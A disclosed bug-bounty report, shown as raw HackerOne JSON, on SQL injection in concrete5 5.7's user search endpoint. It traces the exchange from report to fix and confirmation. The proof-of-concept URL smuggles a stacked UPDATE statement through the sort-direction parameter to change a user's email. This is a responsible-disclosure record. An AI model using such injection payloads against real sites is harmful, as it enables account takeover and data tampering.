{"id":38778,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODc3OA==","url":"https://hackerone.com/reports/38778","title":"SQL injection in conc/index.php/ccm/system/search/users/submit","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-12-09T06:53:56.956Z","submitted_at":"2014-12-09T06:53:56.956Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"yujitounai","url":"/yujitounai","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/199/b8a53ab8db95ee7ec960be9cbbf865eda97e2c90_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":60,"url":"https://hackerone.com/concrete5","handle":"concrete5","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/060/c549a89ab4a3550cb9bfdeba1bee6d77e2019c7e_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/060/c549a89ab4a3550cb9bfdeba1bee6d77e2019c7e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"concrete5","twitter_handle":"concrete5","website":"https://www.concrete5.org","about":"A simple and powerful content management system."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-04-26T23:29:07.469Z","bug_reporter_agreed_on_going_public_at":"2015-03-10T22:37:05.734Z","team_member_agreed_on_going_public_at":"2016-04-26T23:29:07.395Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello.\r\nI found SQL injection in conc/index.php/ccm/system/search/users/submit\r\n\r\nPoC is below\r\n\r\nWhen User login as Administrator\r\nthe user open this link\r\n\r\nhttp://172.20.0.49/conc/index.php/ccm/system/search/users/submit?\u0026ccm_order_by=u.uEmail\u0026ccm_order_by_direction=desc;UPDATE%20%60conc501%60.%60Users%60%20SET%20%60uEmail%60%20=%20%27user@evilhost%27%20WHERE%20%60users%60.%60uID%60%20=%202;--\r\n\r\nand update user's email address.\r\nand I think I can do various things ;)\r\n\r\nI tested to work concrete5 5.7.2.1 on Apache(using ammps) Windows8\r\n","vulnerability_information_html":"\u003cp\u003eHello.\u003cbr\u003e\nI found SQL injection in conc/index.php/ccm/system/search/users/submit\u003c/p\u003e\n\n\u003cp\u003ePoC is below\u003c/p\u003e\n\n\u003cp\u003eWhen User login as Administrator\u003cbr\u003e\nthe user open this link\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://172.20.0.49/conc/index.php/ccm/system/search/users/submit?\u0026amp;ccm_order_by=u.uEmail\u0026amp;ccm_order_by_direction=desc%3BUPDATE%20%60conc501%60.%60Users%60%20SET%20%60uEmail%60%20=%20%27user@evilhost%27%20WHERE%20%60users%60.%60uID%60%20=%202%3B--\" href=\"/redirect?url=http%3A%2F%2F172.20.0.49%2Fconc%2Findex.php%2Fccm%2Fsystem%2Fsearch%2Fusers%2Fsubmit%3F%26ccm_order_by%3Du.uEmail%26ccm_order_by_direction%3Ddesc%253BUPDATE%2520%2560conc501%2560.%2560Users%2560%2520SET%2520%2560uEmail%2560%2520%3D%2520%2527user%40evilhost%2527%2520WHERE%2520%2560users%2560.%2560uID%2560%2520%3D%25202%253B--\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://172.20.0.49/conc/index.php/ccm/system/search/users/submit?\u0026amp;ccm_order_by=u.uEmail\u0026amp;ccm_order_by_direction=desc%3BUPDATE%20%60conc501%60.%60Users%60%20SET%20%60uEmail%60%20=%20%27user@evilhost%27%20WHERE%20%60users%60.%60uID%60%20=%202%3B--\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eand update user\u0026#39;s email address.\u003cbr\u003e\nand I think I can do various things ;)\u003c/p\u003e\n\n\u003cp\u003eI tested to work concrete5 5.7.2.1 on Apache(using ammps) Windows8\u003c/p\u003e\n","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":23098,"file_name":"__________2014-12-09_15.37.48.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/023/098/8d49eeb61e43136cc15626b8ecd738b5944eac06/__________2014-12-09_15.37.48.png?response-content-disposition=attachment%3B%20filename%3D%22__________2014-12-09_15.37.48.png%22%3B%20filename%2A%3DUTF-8%27%27__________2014-12-09_15.37.48.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054829Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026X-Amz-Signature=fa3284c56d3b90c21fdd8c8ab0ab709577a4db74f3367d743b86f6ee090ba735","file_size":205139,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":2,"voters":["sw33tlie","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":174719,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I tested this against the legacy version 5.6. Doesn't seem to be vulnerable. 5.6 uses some kind of auto sort array:\nhttps://github.com/concrete5/concrete5/blob/master/web/concrete/core/models/user_list.php#L18\n\nValid values must be in that array:\nhttps://github.com/concrete5/concrete5/blob/master/web/concrete/core/libraries/database_item_list.php#L49\n\n(I only maintain 5.6, not 5.7)","markdown_message":"\u003cp\u003eI tested this against the legacy version 5.6. Doesn\u0026#39;t seem to be vulnerable. 5.6 uses some kind of auto sort array:\u003cbr\u003e\n\u003ca title=\"https://github.com/concrete5/concrete5/blob/master/web/concrete/core/models/user_list.php#L18\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fconcrete5%2Fconcrete5%2Fblob%2Fmaster%2Fweb%2Fconcrete%2Fcore%2Fmodels%2Fuser_list.php%23L18\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/concrete5/concrete5/blob/master/web/concrete/core/models/user_list.php#L18\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eValid values must be in that array:\u003cbr\u003e\n\u003ca title=\"https://github.com/concrete5/concrete5/blob/master/web/concrete/core/libraries/database_item_list.php#L49\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fconcrete5%2Fconcrete5%2Fblob%2Fmaster%2Fweb%2Fconcrete%2Fcore%2Flibraries%2Fdatabase_item_list.php%23L49\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/concrete5/concrete5/blob/master/web/concrete/core/libraries/database_item_list.php#L49\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e(I only maintain 5.6, not 5.7)\u003c/p\u003e\n","automated_response":false,"created_at":"2014-12-09T07:29:51.485Z","updated_at":"2014-12-09T07:29:51.485Z","actor":{"username":"remo","cleared":false,"url":"/remo","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":175035,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I am closing the other reports as they are all caused by the same issue.","markdown_message":"\u003cp\u003eI am closing the other reports as they are all caused by the same issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-12-09T19:09:45.432Z","updated_at":"2014-12-09T19:09:45.432Z","actor":{"username":"mnkras","cleared":false,"url":"/mnkras","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/844/ec0ad0d7189e5d34e9b4063ef708e600dca89435_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":175210,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"This should be resolved by the following commit: https://github.com/concrete5/concrete5-5.7.0/commit/0040d23e388f70e6459574c1b98099a56cb75186\n\nCould you check against the develop branch?","markdown_message":"\u003cp\u003eThis should be resolved by the following commit: \u003ca title=\"https://github.com/concrete5/concrete5-5.7.0/commit/0040d23e388f70e6459574c1b98099a56cb75186\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fconcrete5%2Fconcrete5-5.7.0%2Fcommit%2F0040d23e388f70e6459574c1b98099a56cb75186\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/concrete5/concrete5-5.7.0/commit/0040d23e388f70e6459574c1b98099a56cb75186\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eCould you check against the develop branch?\u003c/p\u003e\n","automated_response":false,"created_at":"2014-12-09T22:40:58.698Z","updated_at":"2014-12-09T22:40:58.698Z","actor":{"username":"mnkras","cleared":false,"url":"/mnkras","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/844/ec0ad0d7189e5d34e9b4063ef708e600dca89435_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":176166,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I tested\nhttps://github.com/EC-Joe/concrete5-5.7.0/commit/8a8f323243843ef6073420f5ee247b824f07bb5a\nand I confirm that it's fixed and I can't reproduce the issue.\n","markdown_message":"\u003cp\u003eI tested\u003cbr\u003e\n\u003ca title=\"https://github.com/EC-Joe/concrete5-5.7.0/commit/8a8f323243843ef6073420f5ee247b824f07bb5a\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FEC-Joe%2Fconcrete5-5.7.0%2Fcommit%2F8a8f323243843ef6073420f5ee247b824f07bb5a\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/EC-Joe/concrete5-5.7.0/commit/8a8f323243843ef6073420f5ee247b824f07bb5a\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nand I confirm that it\u0026#39;s fixed and I can\u0026#39;t reproduce the issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-12-11T04:37:52.275Z","updated_at":"2014-12-11T04:37:52.275Z","actor":{"username":"yujitounai","cleared":false,"url":"/yujitounai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/199/b8a53ab8db95ee7ec960be9cbbf865eda97e2c90_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":176519,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Perfect! \n\nThanks for reporting this.\n\nIf you would like some swag, email security@concrete5.org with a link to this report.\n\nMike","markdown_message":"\u003cp\u003ePerfect! \u003c/p\u003e\n\n\u003cp\u003eThanks for reporting this.\u003c/p\u003e\n\n\u003cp\u003eIf you would like some swag, email \u003ca title=\"security@concrete5.org\" href=\"mailto:security@concrete5.org\" rel=\"nofollow noopener noreferrer\"\u003esecurity@concrete5.org\u003c/a\u003e with a link to this report.\u003c/p\u003e\n\n\u003cp\u003eMike\u003c/p\u003e\n","automated_response":false,"created_at":"2014-12-11T13:52:03.451Z","updated_at":"2014-12-11T13:52:03.451Z","actor":{"username":"mnkras","cleared":false,"url":"/mnkras","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/844/ec0ad0d7189e5d34e9b4063ef708e600dca89435_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"yujitounai","url":"/yujitounai"},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":350548,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-03-10T22:37:18.538Z","updated_at":"2015-03-10T22:37:18.538Z","first_to_agree":true,"actor":{"username":"yujitounai","cleared":false,"url":"/yujitounai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/199/b8a53ab8db95ee7ec960be9cbbf865eda97e2c90_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":580360,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Would you mind to publicly disclose this bug?","markdown_message":"\u003cp\u003eWould you mind to publicly disclose this bug?\u003c/p\u003e\n","automated_response":false,"created_at":"2015-09-08T00:43:02.389Z","updated_at":"2015-09-08T00:43:02.389Z","actor":{"username":"yujitounai","cleared":false,"url":"/yujitounai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/199/b8a53ab8db95ee7ec960be9cbbf865eda97e2c90_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":929465,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-04-26T23:29:07.424Z","updated_at":"2016-04-26T23:29:07.424Z","actor":{"username":"mnkras","cleared":false,"url":"/mnkras","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/844/ec0ad0d7189e5d34e9b4063ef708e600dca89435_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":929466,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-04-26T23:29:07.488Z","updated_at":"2016-04-26T23:29:07.488Z","actor":{"username":"mnkras","cleared":false,"url":"/mnkras","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/844/ec0ad0d7189e5d34e9b4063ef708e600dca89435_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}